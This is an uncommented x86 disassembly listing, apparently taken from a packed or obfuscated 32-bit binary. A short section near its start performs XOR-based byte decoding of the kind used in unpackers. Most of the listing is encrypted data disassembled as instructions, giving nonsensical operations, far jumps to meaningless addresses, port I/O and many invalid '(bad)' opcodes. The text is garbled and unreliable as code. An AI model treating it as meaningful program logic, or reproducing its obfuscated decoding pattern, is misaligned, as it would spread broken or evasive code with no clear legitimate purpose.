  412661:	and    bl,BYTE PTR [esi+0x61fa27a3]
  412667:	test   BYTE PTR [ecx+0x37],dl
  41266a:	rcl    DWORD PTR [ebx+esi*2+0x28845b96],cl
  412671:	fiadd  DWORD PTR [ebp-0x6d]
  412674:	call   0x279e:0x9ecc1c19
  41267b:	outs   dx,BYTE PTR ds:[esi]
  41267c:	inc    ebp
  41267d:	imul   eax,DWORD PTR [edx],0xffffffed
  412680:	test   bh,0xfe
  412683:	test   esp,esi
  412685:	retf   
  412686:	mov    bl,0x42
  412688:	xor    al,0xfa
  41268a:	sahf   
  41268b:	in     eax,dx
  41268c:	clc    
  41268d:	adc    bh,BYTE PTR [eax-0x3071c45]
  412693:	daa    
  412694:	pop    ebx
  412695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412696:	mov    esp,0xbd1fdcd7
  41269b:	mov    eax,0x16850f
  4126a0:	add    BYTE PTR [eax],al
  4126a2:	xor    eax,esi
  4126a4:	add    eax,edi
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0xc9
  412711:	mov    esp,DWORD PTR [ebp+0x47]
  412714:	inc    edi
  412715:	push   0x62
  412717:	bound  ecx,QWORD PTR [edx]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx-0x60]
  41271d:	mov    ch,0x5
  41271f:	nop
  412720:	fisubr WORD PTR [eax+ebp*2+0x4e2919e9]
  412727:	pop    ds
  412728:	cmp    al,0x42
  41272a:	stos   BYTE PTR es:[edi],al
  41272b:	jge    0x41271a
  41272d:	push   edi
  41272e:	mov    bl,0x33
  412730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412731:	cmp    ah,dl
  412733:	pop    ebp
  412734:	mov    DWORD PTR [ebp-0x684fbf51],esp
  41273a:	xchg   DWORD PTR [ebx+edx*2+0x66],esp
  41273e:	cli    
  41273f:	inc    edi
  412740:	or     edx,DWORD PTR [eax]
  412742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412743:	loop   0x41273a
  412745:	mov    esi,0xb22e8ac4
  41274a:	aad    0x18
  41274c:	icebp  
  41274d:	xchg   edx,eax
  41274e:	xor    eax,ecx
  412750:	pusha  
  412751:	rol    BYTE PTR ds:0x49602d18,cl
  412757:	cmp    BYTE PTR [eax+0x46cacc8c],ah
  41275d:	mov    ds:0x89df88df,eax
  412762:	inc    esp
  412763:	pop    edi
  412764:	js     0x41275b
  412766:	mov    ds:0x74d5657d,al
  41276b:	mov    cl,0x82
  41276d:	jg     0x41276a
  41276f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412770:	loopne 0x4127eb
  412772:	je     0x4127d4
  412774:	and    eax,0xa9262a2
  412779:	test   eax,0x5387dc88
  41277e:	push   edi
  41277f:	ins    DWORD PTR es:[edi],dx
  412780:	dec    edi
  412781:	inc    edi
  412782:	mov    ds:0x8317145f,eax
  412787:	mov    dh,0x76
  412789:	fnstenv [edx+0x25]
  41278c:	push   edi
  41278d:	repnz imul esi,DWORD PTR [ecx]
  412791:	or     bl,cl
  412793:	sub    BYTE PTR [eax+eax*8-0x93a08c4],0x1a
  41279b:	or     DWORD PTR [ebx+0x34e638d8],0xdf25a8ee
  4127a5:	push   ss
  4127a6:	mov    esi,0xb920bf3f
  4127ab:	rol    ebp,0xb8
  4127ae:	xor    eax,0xa977396f
  4127b3:	dec    esi
  4127b4:	loop   0x41276c
  4127b6:	mov    esi,0x50f09675
  4127bb:	stc    
  4127bc:	dec    edi
  4127bd:	mov    ch,0x91
  4127bf:	adc    BYTE PTR [ebp-0x26e96cad],bl
  4127c5:	cs jno 0x41280a
  4127c8:	or     BYTE PTR [edi-0x12cbfa92],cl
  4127ce:	mov    ss,WORD PTR [esi+0x556950a8]
  4127d4:	in     eax,0x8f
  4127d6:	inc    ebp
  4127d7:	cmp    BYTE PTR [edi+0x49],dh
  4127da:	add    edi,ecx
  4127dc:	ficomp WORD PTR ds:0x2397c72b
  4127e2:	jbe    0x41283e
  4127e4:	aad    0xa5
  4127e6:	lods   eax,DWORD PTR ds:[esi]
  4127e7:	pop    esp
  4127e8:	rcr    DWORD PTR [esi],1
  4127ea:	je     0x412782
  4127ec:	jno    0x4127db
  4127ee:	into   
  4127ef:	cmc    
  4127f0:	ja     0x412845
  4127f2:	mov    ebx,0xfbd1d546
  4127f7:	add    al,0xcd
  4127f9:	mov    ?,WORD PTR [esi+0x55c9ad05]
  4127ff:	icebp  
  412800:	xor    eax,0xcab625b3
  412805:	nop
  412806:	lods   al,BYTE PTR ds:[esi]
  412807:	sub    eax,0x80c69c3
  41280c:	pop    edx
  41280d:	ja     0x412880
  41280f:	mov    edx,DWORD PTR [ecx+0x1050b67c]
  412815:	inc    eax
  412816:	add    esp,DWORD PTR [edx+0x1e]
  412819:	cld    
  41281a:	add    DWORD PTR [edx+0x3369423b],edi
  412820:	loopne 0x412886
  412822:	mov    ch,0xe1
  412824:	ds scas eax,DWORD PTR es:[edi]
  412826:	mov    ecx,0x6adacba6
  41282b:	mov    cl,0x5e
  41282d:	add    BYTE PTR [ebp+0x54],0x55
  412831:	cmp    al,0x34
  412833:	pop    edx
  412834:	cli    
  412835:	pop    ss
  412836:	push   esp
  412837:	lods   al,BYTE PTR ds:[esi]
  412838:	mov    BYTE PTR [esi+0x5d],0x1e
  41283c:	enter  0x245a,0x5a
  412840:	ins    BYTE PTR es:[edi],dx
  412841:	jbe    0x4128af
  412843:	cmp    eax,esi
  412845:	loopne 0x412852
  412847:	adc    al,0xae
  412849:	rcl    DWORD PTR [ebx+esi*2+0x407b46e8],0x3d
  412851:	mov    dh,0xe5
  412853:	pop    edi
  412854:	xchg   esi,eax
  412855:	or     dh,BYTE PTR [ebx-0x783a203f]
  41285b:	test   BYTE PTR [ebp+0x24],0xe2
  41285f:	jbe    0x412893
  412861:	aam    0x15
  412863:	test   dh,dh
  412865:	test   eax,0x20bbca12
  41286a:	dec    edx
  41286b:	pop    eax
  41286c:	inc    edi
  41286d:	daa    
  41286e:	jae    0x412850
  412870:	test   BYTE PTR ds:0xea5862a1,dh
  412876:	hlt    
  412877:	lods   eax,DWORD PTR ds:[esi]
  412878:	push   esp
  412879:	fisub  WORD PTR [ecx+0x6d051698]
  41287f:	mov    al,0x22
  412881:	shr    DWORD PTR [edx+eax*4+0x6a],cl
  412885:	inc    esi
  412886:	mov    esp,0x37f0c5ef
  41288b:	inc    ebx
  41288c:	into   
  41288d:	sbb    esi,DWORD PTR [eax+0x16]
  412890:	push   ebp
  412891:	test   eax,0xd8c2fd17
  412896:	sub    BYTE PTR [edi],bh
  412898:	rcr    BYTE PTR [ecx],1
  41289a:	cdq    
  41289b:	out    dx,al
  41289c:	inc    ecx
  41289d:	retf   0x8001
  4128a0:	sub    al,0xb2
  4128a2:	in     eax,dx
  4128a3:	jno    0x41286c
  4128a5:	leave  
  4128a6:	adc    BYTE PTR [ecx-0x17],0x9a
  4128aa:	sub    esi,DWORD PTR [eax+0x3a]
  4128ad:	jecxz  0x412896
  4128af:	cmp    edi,DWORD PTR [edi-0x3ef28552]
  4128b5:	enter  0x438c,0xa2
  4128b9:	or     cl,BYTE PTR [eax]
  4128bb:	xchg   edx,eax
  4128bc:	iret   
  4128bd:	sub    DWORD PTR [ecx],esi
  4128bf:	jns    0x4128d7
  4128c1:	inc    ebp
  4128c2:	mov    eax,0x1c7ce79f
  4128c7:	mov    edx,0x88c43c0d
  4128cc:	lds    ebp,FWORD PTR [ebx+0x413fadc4]
  4128d2:	pusha  
  4128d3:	and    DWORD PTR [eax-0x4be9653c],edx
  4128d9:	or     dl,BYTE PTR [edi-0x6b]
  4128dc:	dec    eax
  4128dd:	into   
  4128de:	fs ds addr16 dec ebx
  4128e2:	mov    dl,0x4f
  4128e4:	stc    
  4128e5:	addr16 iret 
  4128e7:	dec    ecx
  4128e8:	mov    edi,0x812efb39
  4128ed:	mov    BYTE PTR [ebx],bh
  4128ef:	sbb    dl,BYTE PTR [esi]
  4128f1:	rcl    BYTE PTR [eax],1
  4128f3:	pushf  
  4128f4:	sub    WORD PTR [edi],cx
  4128f7:	in     al,dx
  4128f8:	jb     0x412932
  4128fa:	mov    ds:0xd01ff04d,eax
  4128ff:	mov    ah,0xb2
  412901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412902:	data16 jle 0x412919
  412905:	punpckldq mm1,DWORD PTR [eax+edx*8-0x31]
  41290a:	xor    eax,0xe1b4c0a0
  41290f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412910:	sbb    edi,DWORD PTR [esp+eax*8+0x34]
  412914:	push   edx
  412915:	mov    eax,0x84f04736
  41291a:	sti    
  41291b:	xchg   edi,eax
  41291c:	bound  ebx,QWORD PTR [edx+0x25368974]
  412922:	stos   DWORD PTR es:[edi],eax
  412923:	jmp    0x412982
  412925:	xor    al,0x54
  412927:	out    0x81,eax
  412929:	push   edi
  41292a:	in     eax,0xc3
  41292c:	std    
  41292d:	mov    edx,0xfb3cfda8
  412932:	cmp    edi,edi
  412934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412935:	xor    ebx,DWORD PTR [esi]
  412937:	outs   dx,BYTE PTR ds:[esi]
  412938:	jno    0x4128f2
  41293a:	or     ebp,ebp
  41293c:	mov    ch,0xbf
  41293e:	rcr    DWORD PTR [eax],0x9b
  412941:	push   ecx
  412942:	adc    al,0xe5
  412944:	mov    eax,0x4e38c11
  412949:	ror    dh,1
  41294b:	(bad)  
  41294c:	shl    BYTE PTR [ebx],cl
  41294e:	popf   
  41294f:	xchg   ebp,eax
  412950:	sbb    BYTE PTR [esi-0x19ae284],dh
  412956:	sbb    ecx,DWORD PTR [ebp-0x59651a06]
  41295c:	adc    eax,0x7e6df2cc
  412961:	mov    eax,ds:0x4e5ed7f1
  412966:	and    DWORD PTR [ebx+ebp*8+0x45],esp
  41296a:	dec    edx
  41296b:	popa   
  41296c:	inc    esp
  41296d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41296e:	test   eax,0xab497880
  412973:	push   edx
  412974:	fs sti 
  412976:	je     0x412988
  412978:	leave  
  412979:	adc    ebx,DWORD PTR [eax-0x72]
  41297c:	xchg   ecx,eax
  41297d:	adc    eax,0xe47a9b30
  412982:	pop    ebp
  412983:	mov    ecx,0x69c5b51e
  412988:	call   0x7755:0xa165f0f8
  41298f:	pop    ebp
  412990:	sbb    bh,BYTE PTR [eax-0x1c4b888a]
  412996:	shl    DWORD PTR [edx],1
  412998:	mov    WORD PTR [edi-0x47b6c4cb],fs
  41299e:	fld    QWORD PTR [eax+0x36]
  4129a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129a2:	jg     0x41292d
  4129a4:	xchg   DWORD PTR [edi],ebx
  4129a6:	and    cl,BYTE PTR [esi-0x74ff82dd]
  4129ac:	je     0x4129d2
  4129ae:	(bad)
  4129b2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129b4:	rcl    DWORD PTR [eax],0x24
  4129b7:	in     al,dx
  4129b8:	xor    DWORD PTR [edi],edx
  4129ba:	pop    ss
  4129bb:	xor    edx,DWORD PTR [edi-0x70f00c5b]
  4129c1:	dec    esi
  4129c2:	rol    DWORD PTR [edx],1
  4129c4:	les    edi,FWORD PTR [ebp+0x5a]
  4129c7:	in     al,0x67
  4129c9:	jnp    0x4129ee
  4129cb:	adc    ch,dl
  4129cd:	daa    
  4129ce:	fs add eax,0x943c262e
  4129d4:	enter  0xb405,0xf
  4129d8:	adc    ebx,DWORD PTR [edi-0xcc77842]
  4129de:	lock cmp ebp,DWORD PTR [ebp-0x34ddb7e1]
  4129e5:	xor    eax,DWORD PTR [edx+0x6001378f]
  4129eb:	int    0x9b
  4129ed:	lds    ecx,FWORD PTR [esp+ebx*4]
  4129f0:	into   
  4129f1:	push   ebp
  4129f2:	add    DWORD PTR [ecx],0x7d
  4129f5:	pop    edi
  4129f6:	neg    dl
  4129f8:	pop    ebx
  4129f9:	sti    
  4129fa:	mov    bh,0x3
  4129fc:	jle    0x412a57
  4129fe:	out    dx,al
  4129ff:	push   ebx
  412a00:	xor    DWORD PTR [ecx-0x59438159],ecx
  412a06:	push   ds
  412a07:	mov    eax,ds:0x71b4e34
  412a0c:	jae    0x4129f4
  412a0e:	mov    edx,0x30d601af
  412a13:	xchg   DWORD PTR [ecx+0x5718412f],esi
  412a19:	mov    ebx,0x79b7a153
  412a1e:	pop    ebx
  412a1f:	jecxz  0x4129eb
  412a21:	pop    esp
  412a22:	fdiv   DWORD PTR [ecx]
  412a24:	enter  0xbf69,0x3
  412a28:	cdq    
  412a29:	retf   0xf251
  412a2c:	inc    ebx
  412a2d:	out    0x5d,eax
  412a2f:	or     al,ch
  412a31:	fdivr  QWORD PTR [eax-0x169260d7]
  412a37:	and    DWORD PTR [edi],edx
  412a39:	ficom  WORD PTR [edx+eax*2]
  412a3c:	out    0x3d,eax
  412a3e:	inc    edi
  412a3f:	test   al,0xfd
  412a41:	push   ss
  412a42:	clc    
  412a43:	push   es
  412a44:	int    0xb9
  412a46:	fs (bad) 
  412a48:	cld    
  412a49:	aaa    
  412a4a:	xlat   BYTE PTR ds:[ebx]
  412a4b:	xor    DWORD PTR [edx*4-0x6c414618],ecx
  412a52:	jge    0x4129d4
  412a54:	dec    ebp
  412a55:	add    BYTE PTR [edi+0x7a9786d0],cl
  412a5b:	pop    edx
  412a5c:	out    dx,eax
  412a5d:	mov    edx,0xa69dd8e6
  412a62:	dec    esi
  412a63:	sar    BYTE PTR [ecx],cl
  412a65:	mov    ss,WORD PTR [eax+0x7861496d]
  412a6b:	dec    edi
  412a6c:	and    cl,BYTE PTR [ecx-0x1c]
  412a6f:	ffreep st(5)
  412a71:	fs xchg edi,eax
  412a73:	mov    ebp,0x6b4bbd67
  412a78:	push   cs
  412a79:	jae    0x412a51
  412a7b:	(bad)  
  412a7c:	(bad)  
  412a7d:	cmp    al,0x69
  412a7f:	inc    cx
  412a81:	(bad)  
  412a82:	fsubp  st(6),st
  412a84:	aad    0x52
  412a86:	sbb    DWORD PTR [ebx-0x14],edx
  412a89:	xchg   edx,eax
  412a8a:	jp     0x412a75
  412a8c:	pop    ss
  412a8d:	fsub   DWORD PTR [edx+edx*8-0x43aa2247]
  412a94:	inc    ebx
  412a95:	and    BYTE PTR [esi],bl
  412a97:	outs   dx,DWORD PTR ds:[esi]
  412a98:	scas   al,BYTE PTR es:[edi]
  412a99:	imul   esi,ecx,0xcd59c3ee
  412a9f:	jmp    0x3c4d646
  412aa4:	outs   dx,BYTE PTR ds:[esi]
  412aa5:	xchg   edx,eax
  412aa6:	icebp  
  412aa7:	xchg   ebx,eax
  412aa8:	jmp    0xfe406e8b
  412aad:	popf   
  412aae:	hlt    
  412aaf:	push   ecx
  412ab0:	or     BYTE PTR [edx+0x732cacff],bh
  412ab6:	add    BYTE PTR [ebx-0x11b6adba],dh
  412abc:	dec    edx
  412abd:	das    
  412abe:	adc    ebp,DWORD PTR [ecx]
  412ac0:	fstp   QWORD PTR [ebx]
  412ac2:	scas   al,BYTE PTR es:[edi]
  412ac3:	sub    BYTE PTR [eax-0x75f518c7],0x4d
  412aca:	push   ss
  412acb:	aam    0x9d
  412acd:	hlt    
  412ace:	dec    esi
  412acf:	pushf  
  412ad0:	pop    esp
  412ad1:	push   ebx
  412ad2:	repz push es
  412ad4:	(bad)  
  412ad5:	mov    dh,0xcf
  412ad7:	sub    al,0x8f
  412ad9:	imul   bl
  412adb:	add    edi,DWORD PTR [ebx+0x36553fca]
  412ae1:	and    eax,0x23955075
  412ae6:	pop    edi
  412ae7:	xor    edx,DWORD PTR [esp+eax*4-0x5f2b70bf]
  412aee:	popa   
  412aef:	xor    al,0x15
  412af1:	repz mov ebp,0x7659ef4a
  412af7:	fdiv   QWORD PTR [edi-0x52]
  412afa:	sar    DWORD PTR [edi],0x23
  412afd:	sub    esp,DWORD PTR [ebx+0x3cd2647c]
  412b03:	cmp    eax,0x703b456c
  412b08:	jmp    0x59a0:0x52104bdf
  412b0f:	inc    ebp
  412b10:	mov    ah,0xd1
  412b12:	mov    ecx,0xa4463eb4
  412b17:	and    ch,BYTE PTR [edi+ecx*1]
  412b1a:	mov    ecx,0x5cc10d27
  412b1f:	mov    ch,0xa6
  412b21:	cdq    
  412b22:	jmp    0xe498:0xb27935f4
  412b29:	dec    eax
  412b2a:	stc    
  412b2b:	and    BYTE PTR [edx],cl
  412b2d:	xchg   ebp,eax
  412b2e:	ret    
  412b2f:	adc    edx,edi
  412b31:	dec    eax
  412b32:	lock jo 0x412bab
  412b35:	adc    edx,ebx
  412b37:	xlat   BYTE PTR ds:[ebx]
  412b38:	and    BYTE PTR [esi+ecx*2],bh
  412b3b:	dec    BYTE PTR [ecx+eiz*2]
  412b3e:	or     BYTE PTR [ebx-0x380e49f2],al
  412b44:	and    eax,0x716ed94a
  412b49:	retf   
  412b4a:	sbb    BYTE PTR [edx-0x51],bl
  412b4d:	test   DWORD PTR [eax+0x6b44337e],ebp
  412b53:	iret   
  412b54:	and    dh,dh
  412b56:	jecxz  0x412ae4
  412b58:	or     ah,BYTE PTR [edx+edi*4]
  412b5b:	int    0x23
  412b5d:	scas   al,BYTE PTR es:[edi]
  412b5e:	mov    ebp,0xcda1474d
  412b63:	mov    eax,ds:0x1ca0a228
  412b68:	iret   
  412b69:	mov    dh,0x49
  412b6b:	jnp    0x412b6f
  412b6d:	clc    
  412b6e:	rcr    ebp,1
  412b70:	aas    
  412b71:	enter  0x3d0b,0x98
  412b75:	nop
  412b76:	sbb    DWORD PTR [ecx+0x71],0xffffff8f
  412b7a:	aad    0xef
  412b7c:	pop    ss
  412b7d:	in     al,dx
  412b7e:	clc    
  412b7f:	push   es
  412b80:	dec    ebp
  412b81:	dec    ecx
  412b82:	jp     0x412b93
  412b84:	sti    
  412b85:	push   esp
  412b86:	gs stos DWORD PTR es:[edi],eax
  412b88:	jo     0x412c01
  412b8a:	jns    0x412b8f
  412b8c:	dec    ecx
  412b8d:	loopne 0x412c0a
  412b8f:	jl     0x412b1b
  412b91:	aam    0x45
  412b93:	mov    ecx,0x3a51ce88
  412b98:	sub    al,0x8b
  412b9a:	xor    eax,0xb03a1137
  412b9f:	pusha  
  412ba0:	sbb    al,0x45
  412ba2:	(bad)  
  412ba3:	dec    esp
  412ba4:	dec    ebp
  412ba5:	push   0xffffffe2
  412ba7:	xchg   edx,eax
  412ba8:	jmp    0x412c25
  412baa:	cmc    
  412bab:	mov    eax,0x5a303465
  412bb0:	pop    ebx
  412bb1:	xchg   esp,eax
  412bb2:	fs mov ah,0x7
  412bb5:	inc    esi
  412bb6:	jnp    0x412bcd
  412bb8:	test   DWORD PTR ds:0xd9d62b5c,ebx
  412bbe:	je     0x412b56
  412bc0:	repnz mov cl,0xd0
  412bc3:	jmp    0x7ceb:0x8e618b82
  412bca:	gs jbe 0x412b87
  412bcd:	pop    ecx
  412bce:	xchg   ecx,eax
  412bcf:	sbb    edx,DWORD PTR [ebx-0x6e]
  412bd2:	bnd jmp 0xee38cf12
  412bd8:	mov    edi,0x28632544
  412bdd:	push   cs
  412bde:	pop    ss
  412bdf:	imul   esp,ecx,0xffffffb0
  412be2:	inc    edi
  412be3:	ror    ah,1
  412be5:	xchg   ah,cl
  412be7:	pop    edx
  412be8:	inc    esi
  412be9:	popf   
  412bea:	jp     0x412b73
  412bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bed:	pop    esp
  412bee:	dec    esp
  412bef:	popf   
  412bf0:	adc    BYTE PTR [ecx-0x14],dl
  412bf3:	in     al,dx
  412bf4:	sbb    esi,edx
  412bf6:	pop    ecx
  412bf7:	adc    al,0x13
  412bf9:	dec    edi
  412bfa:	cmp    al,0xb4
  412bfc:	jle    0x412c7a
  412bfe:	mov    ds:0xec464402,eax
  412c03:	mov    dh,0x5c
  412c05:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  412c07:	lahf   
  412c08:	cmp    ch,BYTE PTR [eax+ebp*1]
  412c0b:	fucom  st(3)
  412c0d:	push   0xe387690d
  412c12:	fwait
  412c13:	bound  edx,QWORD PTR [ecx+0x27]
  412c16:	pop    es
  412c17:	mov    esp,0xde0ec042
  412c1c:	mov    ebp,0x1dcf0d2a
  412c21:	clc    
  412c22:	dec    ecx
  412c23:	dec    ecx
  412c24:	jbe    0x412c9f
  412c26:	lea    eax,[ecx]
  412c28:	jb     0x412c8e
  412c2a:	push   es
  412c2b:	inc    edx
  412c2c:	mov    ecx,0x12623a42
  412c31:	in     al,0xc0
  412c33:	hlt    
  412c34:	adc    ah,BYTE PTR [eax]
  412c36:	in     al,dx
  412c37:	mov    edi,0x7ab0d7ac
  412c3c:	mov    ecx,0xc73d3e46
  412c41:	xchg   esi,eax
  412c42:	jp     0x412c55
  412c44:	vpmaddwd xmm3,xmm1,XMMWORD PTR [eax-0x5c8b215b]
  412c4c:	or     esp,edi
  412c4e:	adc    ebp,DWORD PTR [ecx]
  412c50:	scas   al,BYTE PTR es:[edi]
  412c51:	arpl   ax,bp
  412c53:	mov    ebp,DWORD PTR [edi+0x7c79c926]
  412c59:	xchg   ebx,eax
  412c5a:	loop   0x412c80
  412c5c:	icebp  
  412c5d:	jmp    0x4bc6:0x281db6f4
  412c64:	frstor [esi+0x67]
  412c67:	mov    esp,0xb21e51c5
  412c6c:	pop    esi
  412c6d:	jge    0x412c18
  412c6f:	or     ch,BYTE PTR [edi-0x5]
  412c72:	and    eax,0xb8559b7
  412c77:	adc    BYTE PTR [ebx],ch
  412c79:	frstor [eax+0x18]
  412c7c:	fbld   TBYTE PTR [ebx+eiz*1+0x3f]
  412c80:	ins    BYTE PTR es:[edi],dx
  412c81:	in     eax,0x95
  412c83:	push   ebx
  412c84:	xor    bh,BYTE PTR [ebx]
  412c86:	inc    esi
  412c87:	ds pop es
  412c89:	fdiv   st(2),st
  412c8b:	jl     0x412cc9
  412c8d:	mov    ebx,?
  412c8f:	test   DWORD PTR [eax-0x57],ecx
  412c92:	arpl   ax,bx
  412c94:	cmp    ah,BYTE PTR [eax]
  412c96:	shld   DWORD PTR [esi],edx,cl
  412c99:	adc    eax,0x80e4493
  412c9e:	mov    DWORD PTR [ebp-0x15784787],esp
  412ca4:	dec    edi
  412ca5:	mov    ds:0xf7b418fa,al
  412caa:	or     eax,0x83843366
  412caf:	cmp    bl,BYTE PTR [eax-0x9eba120]
  412cb5:	push   0x2d
  412cb7:	push   edi
  412cb8:	out    dx,al
  412cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cba:	xchg   esp,eax
  412cbb:	jge    0x412cf0
  412cbd:	repz es cwde 
  412cc0:	outs   dx,BYTE PTR ds:[esi]
  412cc1:	mov    eax,0x3a8d2ca1
  412cc6:	xchg   ebx,eax
  412cc7:	fucom  st(0)
  412cc9:	jmp    DWORD PTR [esi+0x65d88def]
  412ccf:	cmc    
  412cd0:	aam    0x5b
  412cd2:	pop    ebp
  412cd3:	hlt    
  412cd4:	ins    DWORD PTR es:[edi],dx
  412cd5:	fucomi st,st(2)
  412cd7:	or     DWORD PTR [ebx-0x11],edx
  412cda:	adc    al,0x24
  412cdc:	push   ds
  412cdd:	clc    
  412cde:	xor    edi,esi
  412ce0:	mov    cl,BYTE PTR [esi-0x3b954799]
  412ce6:	ss inc ecx
  412ce8:	mov    dl,0xc1
  412cea:	xchg   eax,ecx
  412cec:	inc    edi
  412ced:	int    0xec
  412cef:	retf   
  412cf0:	push   es
  412cf1:	test   ah,bh
  412cf3:	(bad)
  412cf7:	enter  0x6f4f,0x56
  412cfb:	loop   0x412d41
  412cfd:	jmp    0x7d3:0x64943cad
  412d04:	add    edi,DWORD PTR [eax-0x3]
  412d07:	iret   
  412d08:	sbb    BYTE PTR ds:0x13e4638b,cl
  412d0e:	cmp    esp,eax
  412d10:	push   cs
  412d11:	out    0x41,eax
  412d13:	inc    esi
  412d14:	leave  
  412d15:	xchg   ch,bh
  412d17:	inc    esi
  412d18:	mov    edx,0x8b858c39
  412d1d:	cmp    dl,BYTE PTR [ecx+0x75182a4f]
  412d23:	mov    ah,0x1f
  412d25:	jbe    0x412d2f
  412d27:	sahf   
  412d28:	shr    DWORD PTR [edi+ebp*8-0x6820fc4e],0x4f
  412d30:	pop    edi
  412d31:	pop    eax
  412d32:	mov    cl,0x54
  412d34:	loop   0x412ccd
  412d36:	cmp    ch,BYTE PTR [ecx]
  412d38:	sti    
  412d39:	test   bl,ah
  412d3b:	(bad)  
  412d3c:	sti    
  412d3d:	int3   
  412d3e:	out    0xaf,eax
  412d40:	push   es
  412d41:	push   es
  412d42:	test   eax,0xa81fca3d
  412d47:	jmp    0xde050761
  412d4c:	push   cs
  412d4d:	mov    dh,bh
  412d4f:	or     DWORD PTR [eax+0x32f6ff89],eax
  412d55:	sar    BYTE PTR [edi-0x8d137a3],cl
  412d5b:	add    bl,BYTE PTR [edi-0x6c]
  412d5e:	mov    ebx,0x16ae2cf5
  412d63:	add    eax,0xb630bbc1
  412d68:	loopne 0x412d0a
  412d6a:	mov    fs,WORD PTR [ebp+0x11d3973a]
  412d70:	clc    
  412d71:	int    0x43
  412d73:	ret    
  412d74:	or     dl,BYTE PTR [edi+ebx*1-0x584172d1]
  412d7b:	jl     0x412cfe
  412d7d:	pop    esi
  412d7e:	add    ah,dh
  412d80:	inc    ecx
  412d81:	pop    esp
  412d82:	pop    edi
  412d83:	push   ds
  412d84:	jmp    0xba67da2f
  412d89:	push   esp
  412d8a:	jp     0x412d1e
  412d8c:	mov    edx,0x8ef40a0a
  412d91:	dec    esi
  412d92:	xchg   ecx,eax
  412d93:	cwde   
  412d94:	pop    es
  412d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d96:	pop    ss
  412d97:	les    edi,FWORD PTR [edi-0x32]
  412d9a:	cmc    
  412d9b:	mov    ecx,0xcbdf7509
  412da0:	test   DWORD PTR [ebx+eiz*8],edi
  412da3:	jo     0x412e0f
  412da5:	push   esi
  412da6:	int    0x15
  412da8:	inc    ecx
  412da9:	adc    DWORD PTR [esp+ecx*1+0x49bfbe5f],eax
  412db0:	mov    esp,0x2db07e26
  412db5:	fdivr  st,st(6)
  412db7:	inc    ecx
  412db8:	jns    0x412e0f
  412dba:	lods   al,BYTE PTR ds:[esi]
  412dbb:	pop    esp
  412dbc:	imul   ebp,DWORD PTR ds:0x9ee28891,0x7
  412dc3:	sbb    DWORD PTR [eax+0x37],ebp
  412dc6:	cmp    ah,BYTE PTR [esi+esi*8]
  412dc9:	sar    BYTE PTR [edi-0x68],cl
  412dcc:	cmp    BYTE PTR ds:0x77fd5ca4,0x42
  412dd3:	aas    
  412dd4:	punpckhwd mm6,QWORD PTR [edi+0x26]
  412dd8:	and    al,0xf7
  412dda:	cwde   
  412ddb:	(bad)  
  412ddc:	std    
  412ddd:	fs out 0xd,al
  412de0:	sti    
  412de1:	or     DWORD PTR [esi],ebx
  412de3:	fst    QWORD PTR [edx]
  412de5:	stc    
  412de6:	leave  
  412de7:	lds    esp,FWORD PTR [edx-0x1c]
  412dea:	fistp  QWORD PTR [ecx+0x1b4ef85]
  412df0:	or     eax,0x6a3817c8
  412df5:	std    
  412df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df7:	cmp    edi,eax
  412df9:	inc    esp
  412dfa:	inc    eax
  412dfb:	xchg   ecx,eax
  412dfc:	push   cs
  412dfd:	stc    
  412dfe:	or     BYTE PTR [edi+0x1a0c3cd4],0x2
  412e05:	mov    ch,0x93
  412e07:	cs scas eax,DWORD PTR es:[edi]
  412e09:	and    esp,DWORD PTR ds:0x8a6fa581
  412e0f:	xchg   ebp,eax
  412e10:	test   al,0x25
  412e12:	int3   
  412e13:	sub    eax,esp
  412e15:	pop    esi
  412e16:	cmp    BYTE PTR [ebp+0x354789a8],bl
  412e1c:	push   esi
  412e1d:	aam    0x93
  412e1f:	push   eax
  412e20:	sub    DWORD PTR [esi+0x78c607f],ecx
  412e26:	sub    dl,BYTE PTR [ecx+edx*1+0x1b]
  412e2a:	cmp    al,0xbd
  412e2c:	bound  ebp,QWORD PTR [esi+ecx*1-0x29]
